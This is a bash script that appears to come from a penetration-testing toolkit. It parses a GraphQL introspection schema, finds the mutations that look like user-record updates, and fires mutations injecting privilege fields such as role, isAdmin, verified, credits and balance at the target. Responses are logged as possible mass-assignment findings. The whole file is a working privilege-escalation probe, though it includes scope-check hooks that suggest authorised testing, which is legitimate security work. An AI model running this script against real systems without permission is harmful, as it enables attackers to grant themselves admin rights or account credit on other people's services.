#!/usr/bin/env bash
# chain/graphql-mass-assign.sh
#
# GraphQL mutations frequently expose fields the API client never sets —
# `role`, `isAdmin`, `verified`, `tier`. Once we have the schema (via
# introspection or clairvoyance), we can enumerate every mutation that
# touches the user record and probe for mass-assignment.

PHASE="chain-graphql-mass-assign"
. "$(dirname "$0")/../vuln/_lib.sh"
require_target
ensure_scope
OUTDIR=$(out_dir "$PHASE")

GQL_URL="${GQL_URL:-https://$TARGET/graphql}"
AUTH="${AUTH:-}"
SCHEMA_FILE="${SCHEMA_FILE:-$RECONFORGE_OUTPUT_DIR/$TARGET/$DATESTAMP/vuln/graphql/introspection.json}"

if [ ! -s "$SCHEMA_FILE" ]; then
    log ERR "no schema at $SCHEMA_FILE — run vuln/graphql.sh first"
    exit 5
fi

# Pull every mutation name
if ! command -v jq >/dev/null 2>&1; then
    log ERR "jq required"
    exit 4
fi

MUTATIONS=$(jq -r '
    .data.__schema.types[]?
    | select(.name == "Mutation")
    | .fields[]?.name' "$SCHEMA_FILE")

if [ -z "$MUTATIONS" ]; then
    log ERR "no mutations found in schema"
    exit 5
fi

log INFO "found $(echo "$MUTATIONS" | wc -l) mutations"

# Standard mass-assignment field probes
FIELDS=(role isAdmin admin verified email_verified plan tier credits balance permissions is_active)

REPORT="$OUTDIR/mass-assign-findings.csv"
echo "mutation,injected_field,injected_value,status,response_excerpt" > "$REPORT"

for m in $MUTATIONS; do
    # Heuristic: only test mutations that look like updates to user records
    case "$m" in
        *[Uu]pdate*|*[Ee]dit*|*[Mm]odify*|*[Ss]et*|*[Cc]reate*[Uu]ser*)
            log INFO "probing $m"
            for f in "${FIELDS[@]}"; do
                # We don't know argument shape — try the minimum:
                # mutation { <m>(input: { ..., <f>: true }) { id } }
                # That's a starting point; the operator refines per-schema.
                q="mutation { $m(input: { $f: true }) { id } }"
                resp=$(curl -sS --max-time 8 -X POST "$GQL_URL" \
                    -H 'Content-Type: application/json' \
                    ${AUTH:+-H "$AUTH"} \
                    -d "$(jq -nc --arg q "$q" '{query: $q}')" 2>/dev/null | head -c 800)
                # Filter the noisy "Unknown argument" responses
                if echo "$resp" | grep -qE "Unknown argument"; then
                    continue
                fi
                excerpt=$(echo "$resp" | tr -d '\n' | head -c 200 | sed 's/"/""/g')
                echo "$m,$f,true,?,\"$excerpt\"" >> "$REPORT"
                if echo "$resp" | grep -qE "\"id\":|\"data\":\\{"; then
                    log INFO "  POSSIBLE BIND: $m / $f"
                fi
            done
            ;;
    esac
done

log INFO "graphql-mass-assign done — review $REPORT"
log INFO "  pivot: any row without 'Unknown argument' is a candidate for manual confirmation"
